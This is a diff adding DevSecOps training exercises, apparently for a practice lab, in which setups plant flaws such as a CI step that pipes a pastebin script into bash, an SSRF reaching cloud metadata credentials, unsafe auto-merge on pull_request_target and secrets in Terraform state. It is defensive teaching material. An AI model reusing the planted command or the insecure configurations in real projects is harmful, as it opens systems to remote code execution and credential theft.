@@ -274,13 +274,13 @@ CMD ["gunicorn", "--bind", "0.0.0.0:8080", "app.main:app"]
       story: "The licence check blocks the release: chartforge is AGPL-3.0-only, which our legal policy forbids for a hosted, closed-source service. It replaced plotkit last week for nicer charts.",
       goal: "Ship without a forbidden licence.",
       setup(s) {
-        s.commit("Switch charts to chartforge", relock(s, s.edit("requirements.in", "plotkit\n", "chartforge\n")), { daysAgo: 6, push: true });
+        s.commit("Switch charts to chartforge", relock(s, s.edit("requirements.in", "plotkit<2\n", "chartforge\n")), { daysAgo: 6, push: true });
       },
       checks: [["No package with a forbidden licence", (s) => !s.licenseFindings(s.head().tree).length], PASSES, INTACT],
       hints: [
         "trivy fs --scanners license . lists each package's licence and which are forbidden.",
         "Changing security/policy.yaml to allow AGPL is a legal decision, not yours to make in a pull request. Go back to the MIT-licensed plotkit.",
-        "sed -i 's/^chartforge$/plotkit/' requirements.in, pip-compile requirements.in, commit, pipeline."
+        "sed -i 's/^chartforge$/plotkit<2/' requirements.in, pip-compile requirements.in, commit, pipeline."
       ],
       lesson: "Licence compliance is part of the supply chain: the SBOM lists every licence, and the gate enforces the list legal agreed.",
       tries: ["trivy fs --scanners license .", "cat security/policy.yaml"]
@@ -320,7 +320,7 @@ CMD ["gunicorn", "--bind", "0.0.0.0:8080", "app.main:app"]
         "Escaping quotes yourself (q.replace(\"'\", \"''\")) still builds SQL from input. The driver should send the value separately.",
         "Edit app/main.py: rows = db.query(\"SELECT id, title FROM books WHERE title ILIKE %s\", (f\"%{q}%\",)). Commit, pipeline."
       ],
-      lesson: "Parameterised queries keep data out of the SQL text, which is the only reliable fix for injection (OWASP Top 10:2021 A03 Injection).",
+      lesson: "Parameterised queries keep data out of the SQL text, which is the only reliable fix for injection (OWASP Top 10:2025 A05 Injection).",
       tries: ["semgrep scan --config p/python app/", "grep -n query app/main.py"]
     },
     {
@@ -376,7 +376,7 @@ CMD ["gunicorn", "--bind", "0.0.0.0:8080", "app.main:app"]
         "Untrusted input must never choose which objects get built. Catalogue data is plain lists and dicts.",
         "sed -i 's/yaml.load(request.data, Loader=yaml.Loader)/yaml.safe_load(request.data)/' app/main.py, commit, pipeline."
       ],
-      lesson: "Deserialisers that construct objects (yaml.Loader, pickle) turn input into code execution. Use the safe loader (OWASP Top 10:2021 A08).",
+      lesson: "Deserialisers that construct objects (yaml.Loader, pickle) turn input into code execution. Use the safe loader (OWASP Top 10:2025 A08 Software or Data Integrity Failures).",
       tries: ["semgrep scan --config p/python app/", "grep -n yaml app/main.py"]
     },
     {
@@ -580,7 +580,7 @@ def build(kind):
         s.commit("Fix AccessDenied on invoices", { "terraform/main.tf": s.edit("terraform/main.tf", `      Action   = ["s3:PutObject", "s3:GetObject"]\n      Resource = "\${aws_s3_bucket.invoices.arn}/invoices/*"`, `      Action   = "*"\n      Resource = "*"`) }, { daysAgo: 2, push: true });
       },
       checks: [
-        ["No wildcard action or resource", (s) => !tfIds(s).some((id) => id === "CKV_AWS_62" || id === "AVD-AWS-0057")],
+        ["No wildcard action or resource", (s) => !tfIds(s).some((id) => id === "CKV_AWS_62" || id === "PRACTICE-AWS-07")],
         ["The role can still put objects in the invoices bucket", (s) => /s3:PutObject/.test(head(s, "terraform/main.tf")) && /invoices\.arn/.test(head(s, "terraform/main.tf"))],
         PASSES, INTACT
       ],
@@ -984,6 +984,160 @@ jobs:
       ],
       lesson: "Shift right complements shift left: new advisories arrive after release, and SBOMs plus continuous scanning tell you where you are exposed.",
       tries: ["grype sbom:./sbom.cdx.json", "osv-scanner scan source -r ."]
+    },
+    {
+      id: "tf-state", group: "Secrets", level: "07", title: "Secrets in Terraform state",
+      story: "gitleaks flags terraform/terraform.tfstate: someone committed the local state file, and state holds every attribute in plain text, including the database password the module set from a variable.",
+      goal: "Get state out of git and into an encrypted remote backend, purge it from history, and rotate the password.",
+      setup(s) {
+        const state = JSON.stringify({ version: 4, terraform_version: "1.9.8", serial: 41, lineage: "8f0c2a6e-practice", resources: [{ mode: "managed", type: "aws_db_instance", name: "orders", provider: "provider[\"registry.terraform.io/hashicorp/aws\"]",
+          instances: [{ attributes: { identifier: "fernleaf-orders", engine: "postgres", username: "orders", password: DB_PW, storage_encrypted: true } }] }] }, null, 2) + "\n";
+        s.commit("Save Terraform state", { "terraform/terraform.tfstate": state }, { daysAgo: 8, push: true });
+      },
+      checks: [
+        ["terraform.tfstate is untracked and .gitignore covers *.tfstate", (s) => !s.tracked("terraform/terraform.tfstate") && S.ignored(s.gitignore(), "terraform/terraform.tfstate")],
+        ["State lives in an encrypted S3 backend", (s) => { const b = R.parseHcl(head(s, "terraform/main.tf")).find((x) => x.type === "terraform"); const be = b && b.blocks.find((x) => x.type === "backend" && x.labels[0] === "s3"); return !!be && be.attrs.encrypt && be.attrs.encrypt.value === true; }],
+        ["The database password was rotated", (s) => s.rotated("prod/orders/db")],
+        ["The state file is gone from every commit on GitHub", (s) => s.pushed() && !s.remoteHasPath("terraform/terraform.tfstate")],
+        PASSES, INTACT
+      ],
+      hints: [
+        "git log --stat -- terraform/terraform.tfstate, then grep -n password terraform/terraform.tfstate. Sensitive values are hidden in plan output, not in state.",
+        "Rotate first (aws secretsmanager rotate-secret --secret-id prod/orders/db), then git rm --cached terraform/terraform.tfstate and echo '*.tfstate*' >> .gitignore. Add a backend to terraform/main.tf: terraform { backend \"s3\" { bucket = \"fernleaf-tfstate\" key = \"api/terraform.tfstate\" region = \"eu-west-1\" encrypt = true use_lockfile = true } }.",
+        "Commit, then git filter-repo --path terraform/terraform.tfstate --invert-paths --force, git remote add origin git@github.com:fernleaf/api.git, git push --force origin main, pipeline."
+      ],
+      lesson: "Terraform state is a secret store whether you want it to be or not. Keep it in an encrypted, access-controlled backend, never in git, and let RDS manage the password (manage_master_user_password).",
+      tries: ["gitleaks git -v", "git log --stat -- terraform/terraform.tfstate"]
+    },
+    {
+      id: "imdsv1", group: "Infrastructure as code", level: "07", title: "IMDSv1 and an SSRF",
+      story: "A bug bounty report: the PDF worker fetches any URL a customer embeds, and http://169.254.169.254/latest/meta-data/iam/security-credentials/ returned the instance role's keys. The worker's launch config still allows IMDSv1.",
+      goal: "Require IMDSv2 on the worker so a plain SSRF cannot read instance credentials.",
+      setup(s) {
+        s.commit("PDF render workers", { "terraform/main.tf": s.read("terraform/main.tf") + `\nresource "aws_instance" "pdf_worker" {\n  ami           = var.worker_ami\n  instance_type = "t3.small"\n  iam_instance_profile = "fernleaf-pdf-worker"\n  metadata_options {\n    http_endpoint = "enabled"\n    http_tokens   = "optional"\n  }\n}\n` }, { daysAgo: 40, push: true });
+      },
+      checks: [["Instances require IMDSv2 (http_tokens = \"required\")", (s) => !tfIds(s).includes("CKV_AWS_79") && /aws_instance/.test(head(s, "terraform/main.tf"))], PASSES, INTACT],
+      hints: [
+        "checkov -d terraform names CKV_AWS_79 and the resource.",
+        "IMDSv2 needs a PUT to get a session token first, which a simple SSRF (a GET to a URL you control) cannot do. Turning the metadata endpoint off would break the instance role.",
+        "sed -i 's/http_tokens   = \"optional\"/http_tokens   = \"required\"/' terraform/main.tf, commit, pipeline. Also rotate: the role's temporary credentials expire on their own, but check CloudTrail for their use."
+      ],
+      lesson: "IMDSv2 turns a common SSRF into a non-event. Require it everywhere (launch templates, account default) and fix the SSRF itself with an allowlist of hosts.",
+      tries: ["checkov -d terraform", "grep -n -A3 metadata_options terraform/main.tf"]
+    },
+    {
+      id: "branch-protection", group: "CI/CD and supply chain", level: "09", title: "Branch protection bypassed",
+      story: "A commit reached main with no pull request: an admin pushed \"Speed up CI\", which pipes a script from a pastebin into bash. Someone had relaxed branch protection to fix a release on Friday: no reviews, admins exempt, force pushes allowed.",
+      goal: "Take the unreviewed change out and restore protection from the reviewed policy in docs/branch-protection.json.",
+      setup(s) {
+        s.gh.protection = { reviews: 0, codeOwners: false, dismissStale: false, enforceAdmins: false, forcePushes: true, deletions: false, checks: [] };
+        s.commit("Document branch protection", { "docs/branch-protection.json": JSON.stringify({ required_status_checks: { strict: true, contexts: ["scan", "build"] }, enforce_admins: true,
+          required_pull_request_reviews: { required_approving_review_count: 1, require_code_owner_reviews: true, dismiss_stale_reviews: true }, restrictions: null, allow_force_pushes: false, allow_deletions: false }, null, 2) + "\n" }, { daysAgo: 90 });
+        s.commit("Speed up CI", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "      - uses: ./.github/actions/install-tools\n      - name: Secret scan", "      - uses: ./.github/actions/install-tools\n      - name: Warm the cache\n        run: curl -fsSL https://paste.example.net/raw/x9Qe1 | bash\n      - name: Secret scan") }, { daysAgo: 1, push: true, author: { name: "Release Admin", email: "admin@fernleaf.example" } });
+      },
+      checks: [
+        ["The unreviewed script download is gone from ci.yml", (s) => !s.workflows(s.head().tree).some((f) => f.id === "curl-pipe-shell")],
+        ["main needs a code-owner review and the scan and build checks", (s) => { const p = s.gh.protection; return p.reviews >= 1 && p.codeOwners && ["scan", "build"].every((c) => p.checks.includes(c)); }],
+        ["Admins are not exempt and force pushes are off", (s) => s.gh.protection.enforceAdmins && !s.gh.protection.forcePushes],
+        PASSES, INTACT
+      ],
+      hints: [
+        "git log --oneline -n 3 and git show HEAD: who pushed what? gh api repos/fernleaf/api/branches/main/protection shows the rules today.",
+        "Revert, do not rewrite: git revert <sha> keeps the record of what happened. Then put back the reviewed policy: gh api -X PUT repos/fernleaf/api/branches/main/protection --input docs/branch-protection.json",
+        "Requiring reviews while enforce_admins is false still lets admins push straight to main. After the PUT, git push and pipeline."
+      ],
+      lesson: "Branch protection (or rulesets) is a security control: required reviews, required checks, no force pushes, and no exemption for admins. Keep the policy in code and alert on changes to it.",
+      tries: ["git log --oneline -n 3", "gh api repos/fernleaf/api/branches/main/protection"]
+    },
+    {
+      id: "dependabot", group: "Dependencies", level: "04", title: "Dependabot triage and safe auto-merge",
+      story: "Four Dependabot pull requests are open, one of them the fix for a critical advisory. The auto-merge workflow someone copied merges any pull request at all, from anyone, before checks finish, majors included, on pull_request_target.",
+      goal: "Merge the security fix, leave the breaking major for a human, and make auto-merge safe.",
+      setup(s) {
+        s.commit("Pin imgresize for the thumbnail bug", relock(s, s.edit("requirements.in", "imgresize\n", "imgresize==2.1.0\n")), { daysAgo: 20 });
+        s.commit("Auto-merge bot pull requests", { ".github/workflows/dependabot-automerge.yml": `name: dependabot-automerge
+
+on: pull_request_target
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  automerge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Merge the pull request
+        env:
+          PR_URL: \${{ github.event.pull_request.html_url }}
+          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
+        run: gh pr merge --merge "$PR_URL"
+` }, { daysAgo: 14, push: true });
+        const pr = (n, pkg, from, to, kind, body) => ({ n, pkg, from, to, kind, state: "OPEN", title: `Bump ${pkg} from ${from} to ${to}`, body });
+        s.gh.prs = [pr(101, "imgresize", "2.1.0", "2.1.4", "patch", "Fixes PRACTICE-2026-0001 (critical, path traversal). Release notes: security fix only."),
+          pr(102, "quickcache", "3.4.0", "3.4.1", "patch", "Bug fixes."),
+          pr(104, "plotkit", "1.6.0", "2.0.0", "major", "BREAKING: Chart.render() removed; use Chart.to_png(). Version 2.0.0.")];
+      },
+      checks: [
+        ["The security fix is merged: imgresize 2.1.4", (s) => atLeast(lockPin(s, "imgresize"), "2.1.4")],
+        ["The breaking plotkit 2.0 is not merged", (s) => S.cmpVer(lockPin(s, "plotkit") || "0", "2") < 0],
+        ["Auto-merge runs on pull_request, only for dependabot[bot], never for majors, and waits for checks (--auto)", (s) => {
+          const t = head(s, ".github/workflows/dependabot-automerge.yml");
+          return !!t && !/pull_request_target/.test(t) && /dependabot\[bot\]/.test(t) && /semver-major/.test(t) && /gh pr merge --auto/.test(t);
+        }],
+        PASSES, INTACT
+      ],
+      hints: [
+        "gh pr list, then gh pr view 101 and gh pr view 104. Which one is a security fix, which one breaks the API?",
+        "gh pr merge 101 --squash lands the security fix on main (it is already in your local history here). Leave 104 for a person: it changes an API the reports use.",
+        "Rewrite .github/workflows/dependabot-automerge.yml (edit it): on: pull_request; job if: github.event.pull_request.user.login == 'dependabot[bot]'; a step uses: dependabot/fetch-metadata@25dd0e34f4fe68f24cc83900b1fe3fe149efef98 # v3.1.0 with id: meta; the merge step if: steps.meta.outputs.update-type != 'version-update:semver-major' and run: gh pr merge --auto --squash \"$PR_URL\"; permissions contents: write and pull-requests: write on the job only. Commit, pipeline."
+      ],
+      lesson: "Auto-merge is safe when it is narrow: only the bot, only patch and minor, only after required checks pass (--auto), with branch protection behind it. Security fixes get merged first; majors get a person.",
+      tries: ["gh pr list", "cat .github/workflows/dependabot-automerge.yml"]
+    },
+    {
+      id: "vex", group: "Containers", level: "11", title: "VEX for a non-exploitable CVE",
+      story: "The image scan blocks the release on PRACTICE-2026-0140 (HIGH, no fix yet) in libpractice-glyphs2, a font library the base image ships. The API never renders text to images; nothing calls it. Security agrees it is not exploitable here.",
+      goal: "Record that decision as an OpenVEX statement the scanner reads, so the gate passes for this CVE only.",
+      setup(s) {
+        s.extraOsVulns = [["libpractice-glyphs2", "2.13.1-1", "PRACTICE-2026-0140", "HIGH", null, "practice-glyphs: heap overflow when rendering crafted fonts"]];
+        s.commit("Release 1.5", { "README.md": s.read("README.md") + "\nRelease 1.5: catalogue imports.\n" }, { daysAgo: 0, push: true });
+      },
+      checks: [
+        ["vex.openvex.json marks PRACTICE-2026-0140 not_affected, with a justification and an impact statement", (s) => s.vexNotAffected(s.head().tree, "vex.openvex.json").includes("PRACTICE-2026-0140")],
+        ["The image scan reads it (trivy image --vex)", (s) => /trivy image[^\n]*--vex[ =]vex\.openvex\.json/.test(head(s, ".github/workflows/ci.yml"))],
+        PASSES, INTACT
+      ],
+      hints: [
+        "pipeline shows the finding; trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:1.0.0 after a docker build shows the package.",
+        "--ignore-unfixed would hide every future unfixed CVE too. A VEX statement is scoped to one vulnerability and one product, with a reason others can audit.",
+        "Create vex.openvex.json (echo '{}' > vex.openvex.json, then edit it) with @context https://openvex.dev/ns/v0.2.0, author, timestamp and one statement: vulnerability name PRACTICE-2026-0140, products [{\"@id\": \"pkg:oci/api?repository_url=ghcr.io/fernleaf/api\"}], status not_affected, justification vulnerable_code_not_in_execute_path, impact_statement explaining why. Add --vex vex.openvex.json to the trivy image line in ci.yml. git add, commit, pipeline."
+      ],
+      lesson: "VEX (Vulnerability Exploitability eXchange) says, in a machine-readable way, whether a known vulnerability affects your product and why. Scanners such as Trivy apply it, so the decision travels with the image.",
+      tries: ["pipeline", "trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:1.0.0"]
+    },
+    {
+      id: "tag-mutability", group: "CI/CD and supply chain", level: "10", title: "Mutable tags and digest pinning",
+      story: "Staging changed with no deploy: someone pushed ghcr.io/fernleaf/api:stable from a branch build and the Pods picked it up on restart. The policy no longer pins Pods to the verified digest; mutateDigest and verifyDigest were switched off to quiet a GitOps diff.",
+      goal: "Make the cluster run exactly the digest that was verified, and deploy by digest.",
+      setup(s) {
+        s.commit("Deploy the stable tag; stop rewriting images", {
+          "k8s/verify-images.yaml": s.edit("k8s/verify-images.yaml", "        - imageReferences:\n            - \"ghcr.io/fernleaf/*\"\n", "        - imageReferences:\n            - \"ghcr.io/fernleaf/*\"\n          mutateDigest: false\n          verifyDigest: false\n"),
+          ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "kubectl -n shop set image deployment/api api=ghcr.io/fernleaf/api:${{ github.sha }}", "kubectl -n shop set image deployment/api api=ghcr.io/fernleaf/api:stable")
+        }, { daysAgo: 5, push: true });
+      },
+      checks: [
+        ["The policy verifies and pins digests (verifyDigest and mutateDigest not false)", (s) => !/(mutateDigest|verifyDigest):\s*false/.test(head(s, "k8s/verify-images.yaml"))],
+        ["CI deploys the commit's image, not a floating tag", (s) => /set image deployment\/api api=ghcr\.io\/fernleaf\/api(@\$\{\{|:\$\{\{ github\.sha \}\})/.test(head(s, ".github/workflows/ci.yml"))],
+        PASSES, INTACT
+      ],
+      hints: [
+        "grep -n set image .github/workflows/ci.yml and cat k8s/verify-images.yaml. A tag is a pointer anyone with push access can move.",
+        "Kyverno's verifyImages checks the signature of the digest and, with mutateDigest, rewrites the Pod to that digest, so a later push to the tag changes nothing. Both default to true; delete the two lines.",
+        "sed -i '/Digest: false/d' k8s/verify-images.yaml and sed -i 's/api:stable/api:${{ github.sha }}/' .github/workflows/ci.yml (or deploy @${{ steps.push.outputs.digest }}). Commit, pipeline."
+      ],
+      lesson: "Tags move; digests do not. Deploy and verify by digest, and use immutable tags where the registry supports them (for example ECR's IMMUTABLE setting).",
+      tries: ["grep -n 'set image' .github/workflows/ci.yml", "cat k8s/verify-images.yaml"]
     }
   ];
 
